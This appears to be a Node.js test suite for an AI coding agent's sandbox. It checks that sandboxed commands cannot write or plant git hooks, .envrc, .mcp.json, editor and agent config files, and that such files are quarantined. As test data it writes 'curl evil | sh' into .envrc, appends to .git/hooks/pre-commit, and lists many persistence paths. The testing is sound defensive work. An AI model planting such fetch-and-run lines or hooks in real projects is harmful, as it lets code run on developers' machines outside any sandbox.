import test from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync, rmSync, realpathSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { wrapCommand, macProfile, containerArgs, protectedWritePaths, detectSandbox, watchProtectedCreations, launchCommand, withQuarantineNote, PROTECTED_FILES, PROTECTED_DIRS } from '../src/sandbox.mjs';
import { protectedConfigPath } from '../src/protected-paths.mjs';
import { executePowerTool } from '../src/power-tools.mjs';

function project(t) {
  const root = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-protect-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true });
  writeFileSync(path.join(root, '.git', 'config'), '[core]\n');
  mkdirSync(path.join(root, '.oasis'));
  return root;
}

test('protected paths are planned for existing and missing git, settings and editor files', (t) => {
  const root = project(t);
  const plan = protectedWritePaths([root]);
  const existing = plan.existing.map((item) => path.relative(root, item.path)).sort();
  assert.deepEqual(existing, ['.git/config', '.git/hooks', '.oasis/commands', '.oasis/agents', '.oasis/skills', '.oasis/hooks'].filter((rel) => existsSync(path.join(root, rel))).sort());
  const missing = plan.missing.map((item) => path.relative(root, item.path) + ':' + item.type).sort();
  assert.ok(missing.includes('.mcp.json:file'));
  assert.ok(missing.includes('.oasis/settings.json:file'));
  assert.ok(missing.includes('.claude:directory'), 'a missing .claude folder is covered as a whole');
  assert.ok(missing.includes('.vscode:directory'));
  assert.ok(!missing.some((item) => item.startsWith('.bashrc')), 'missing rc files get no placeholder');
});

test('worktree .git files are protected instead of .git/hooks', (t) => {
  const root = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-protect-wt-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  writeFileSync(path.join(root, '.git'), 'gitdir: /elsewhere\n');
  const plan = protectedWritePaths([root]);
  assert.ok(plan.existing.some((item) => item.path === path.join(root, '.git') && item.type === 'file'));
  assert.ok(!plan.missing.some((item) => item.path.startsWith(path.join(root, '.git') + path.sep)));
});

test('macOS profile denies writes to protected paths after the workspace allow rule', (t) => {
  const root = project(t);
  const profile = macProfile({ writable: [root], protectedRoots: [root], maskedPaths: [] });
  const allowAt = profile.indexOf('(allow file-write*');
  for (const rel of ['.git/hooks', '.git/config', '.mcp.json', '.oasis/settings.json', '.vscode', '.claude/commands']) {
    const at = profile.indexOf(JSON.stringify(path.join(root, rel)));
    assert.ok(at > allowAt, rel + ' must be denied after the allow rule');
  }
});

test('containers mount existing protected paths read-only', (t) => {
  const root = project(t);
  const args = containerArgs('true', [], { kind: 'docker', writable: [root], protectedRoots: [root] }, root, 'linux');
  assert.ok(args.includes(path.join(root, '.git', 'hooks') + ':' + path.join(root, '.git', 'hooks') + ':ro'));
  assert.ok(args.includes(path.join(root, '.git', 'config') + ':' + path.join(root, '.git', 'config') + ':ro'));
});

const bwrap = process.platform === 'linux' && detectSandbox(true).kind === 'bubblewrap';

test('bubblewrap blocks writes to protected paths and removes its placeholders', { skip: !bwrap && 'bubblewrap is not available' }, (t) => {
  const root = project(t);
  const sandbox = { enabled: true, available: true, kind: 'bubblewrap', writable: [root], protectedRoots: [root], maskedPaths: [], network: false };
  const script = [
    'echo evil >> .git/hooks/pre-commit', 'echo evil >> .git/config', "echo '{}' > .mcp.json", "echo '{}' > .oasis/settings.json",
    'mkdir -p .vscode && echo x > .vscode/tasks.json', 'mkdir -p .claude/commands && echo x > .claude/commands/a.md',
    'echo ok > normal.txt', 'mkdir -p src && echo ok > src/a.js', 'true'
  ].join('; ');
  const launch = wrapCommand('/bin/sh', ['-c', script], sandbox, root);
  const result = spawnSync(launch.command, launch.args, { cwd: root, encoding: 'utf8' });
  launch.release();
  assert.equal(result.status, 0, result.stderr);
  assert.equal(readFileSync(path.join(root, 'normal.txt'), 'utf8'), 'ok\n');
  assert.equal(readFileSync(path.join(root, 'src', 'a.js'), 'utf8'), 'ok\n');
  assert.equal(readFileSync(path.join(root, '.git', 'config'), 'utf8'), '[core]\n');
  assert.deepEqual(readdirSync(path.join(root, '.git', 'hooks')), []);
  for (const rel of ['.mcp.json', '.oasis/settings.json', '.vscode', '.claude']) assert.ok(!existsSync(path.join(root, rel)), rel + ' placeholder must be gone');
});

test('run_shell through the sandbox cleans up placeholders when the command ends', { skip: !bwrap && 'bubblewrap is not available' }, async (t) => {
  const root = project(t);
  const sandbox = { enabled: true, available: true, kind: 'bubblewrap', writable: [root], protectedRoots: [root], maskedPaths: [], network: false, autoAllowShellCommands: true };
  const result = await executePowerTool('run_shell', { command: "echo '{}' > .mcp.json; echo done" }, { sandbox, approval: async () => true, env: process.env }, root);
  assert.match(String(result.stdout || result.output || JSON.stringify(result)), /done/);
  assert.ok(!existsSync(path.join(root, '.mcp.json')));
});

test('only your own settings can turn off project-config protection', async (t) => {
  const { mkdtemp, mkdir: mk, writeFile: wf, rm: rmr } = await import('node:fs/promises');
  const os = await import('node:os');
  const p = await import('node:path');
  const { loadSettings, setWorkspaceTrust, userSettingsPath } = await import('../src/settings.mjs');
  const home = await mkdtemp(p.join(os.tmpdir(), 'oasis-protect-home-'));
  const root = await mkdtemp(p.join(os.tmpdir(), 'oasis-protect-root-'));
  t.after(() => Promise.all([rmr(home, { recursive: true, force: true }), rmr(root, { recursive: true, force: true })]));
  const env = { ...process.env, HOME: home, OASIS_CONFIG_DIR: p.join(home, 'cfg'), OASIS_IGNORE_CLAUDE_SETTINGS: '1' };
  await mk(p.join(root, '.oasis'), { recursive: true });
  await wf(p.join(root, '.oasis', 'settings.json'), JSON.stringify({ sandbox: { enabled: true, protectProjectConfig: false } }));
  await setWorkspaceTrust(root, true, env);
  assert.notEqual((await loadSettings(root, { env })).sandbox.protectProjectConfig, false);
  const userFile = userSettingsPath(env);
  const user = JSON.parse(await (await import('node:fs/promises')).readFile(userFile, 'utf8'));
  await wf(userFile, JSON.stringify({ ...user, sandbox: { protectProjectConfig: false } }));
  assert.equal((await loadSettings(root, { env })).sandbox.protectProjectConfig, false);
});


test('the sandbox protects every protected configuration path, not a shorter list', () => {
  // One concrete example for each pattern in protected-paths.mjs that names a fixed path.
  const examples = ['.oasis/settings.json', '.claude/settings.local.json', '.oasis/hooks/x', '.claude/plugins/p/x', '.oasis/plugins/p/x',
    '.oasis/commands/c.md', '.gemini/commands/c.toml', '.opencode/command/c.md', '.opencode/commands/c.md', 'opencode.json',
    '.agents/agents/a.md', '.gemini/agents/a.md', '.oasis/agents/a.md', '.mcp.json', '.oasis/mcp.json', '.claude/mcp.json', '.lsp.json',
    '.git/hooks/pre-commit', '.git/config', '.cursor/mcp.json', '.cursor/hooks.json', '.cursor/rules/r.mdc', '.cursor/environment.json',
    '.gemini/settings.json', '.gemini/extensions/e/x', '.codex/config.toml', '.continue/config.yaml', '.aider.conf.yml',
    '.vscode/tasks.json', '.devcontainer/devcontainer.json', '.devcontainer.json', '.envrc', '.husky/pre-commit',
    '.pre-commit-config.yaml', 'lefthook.yml', 'lefthook-local.yaml', '.yarnrc.yml', '.pnpmfile.cjs', '.npmrc'];
  const covered = (rel) => PROTECTED_FILES.includes(rel) || PROTECTED_DIRS.some((dir) => rel === dir || rel.startsWith(dir + '/'));
  for (const rel of examples) {
    assert.ok(protectedConfigPath('/w', rel), rel + ' is a protected configuration path');
    assert.ok(covered(rel), rel + ' must also be read-only inside the sandbox');
  }
});

test('files a sandboxed command creates on protected paths are moved out of the workspace', (t) => {
  const root = project(t);
  const quarantine = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-quarantine-')));
  t.after(() => rmSync(quarantine, { recursive: true, force: true }));
  writeFileSync(path.join(root, '.npmrc'), 'registry=https://registry.npmjs.org/\n');
  const watch = watchProtectedCreations([root], { quarantineRoot: quarantine });
  assert.ok(!watch.paths.some((item) => item.rel === '.npmrc'), 'an existing file is left to the read-only mount');
  writeFileSync(path.join(root, '.envrc'), 'curl evil | sh\n');
  mkdirSync(path.join(root, '.husky'));
  writeFileSync(path.join(root, '.husky', 'pre-commit'), '#!/bin/sh\n');
  writeFileSync(path.join(root, 'app.js'), 'ok\n');
  const moved = watch.check();
  assert.deepEqual(moved.map((item) => item.path).sort(), ['.envrc', '.husky']);
  assert.ok(!existsSync(path.join(root, '.envrc')) && !existsSync(path.join(root, '.husky')));
  assert.equal(readFileSync(moved.find((item) => item.path === '.envrc').movedTo, 'utf8'), 'curl evil | sh\n');
  assert.ok(existsSync(path.join(root, 'app.js')) && existsSync(path.join(root, '.npmrc')));
  const result = withQuarantineNote({ exitCode: 0 }, { quarantined: moved });
  assert.deepEqual(result.protectedFilesQuarantined, moved.map((item) => item.path));
  assert.match(result.quarantine, /moved them out of the workspace/);
});

test('bubblewrap: a sandboxed script cannot plant hooks or rc files that run later outside the sandbox', { skip: !bwrap && 'bubblewrap is not available' }, async (t) => {
  const root = project(t);
  const config = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'oasis-quarantine-cfg-')));
  t.after(() => rmSync(config, { recursive: true, force: true }));
  const previous = process.env.OASIS_CONFIG_DIR;
  process.env.OASIS_CONFIG_DIR = config;
  t.after(() => { if (previous === undefined) delete process.env.OASIS_CONFIG_DIR; else process.env.OASIS_CONFIG_DIR = previous; });
  const targets = ['.envrc', '.npmrc', '.lsp.json', 'lefthook.yml', '.husky/pre-commit', '.devcontainer/devcontainer.json', '.oasis/plugins/p/plugin.json', '.codex/config.toml', '.cursor/mcp.json'];
  const script = targets.map((rel) => 'mkdir -p "$(dirname ' + rel + ')" 2>/dev/null; echo x > ' + rel + ' 2>/dev/null').join('; ') + '; true';
  const sandbox = { enabled: true, available: true, kind: 'bubblewrap', writable: [root], protectedRoots: [root], network: false };
  const launch = await launchCommand('/bin/sh', ['-c', script], sandbox, root);
  const run = spawnSync(launch.command, launch.args, { cwd: root, encoding: 'utf8' });
  launch.release();
  assert.equal(run.status, 0, run.stderr);
  for (const rel of targets) assert.ok(!existsSync(path.join(root, rel)), rel + ' must not be left in the workspace');
  const left = readdirSync(root).sort();
  assert.ok(!left.some((name) => ['.envrc', '.npmrc', '.lsp.json', 'lefthook.yml', '.husky', '.devcontainer', '.codex', '.cursor'].includes(name)), left.join(','));
  assert.deepEqual([...launch.quarantined.map((item) => item.path)].sort(), ['.envrc', '.lsp.json', '.npmrc', 'lefthook.yml']);
});
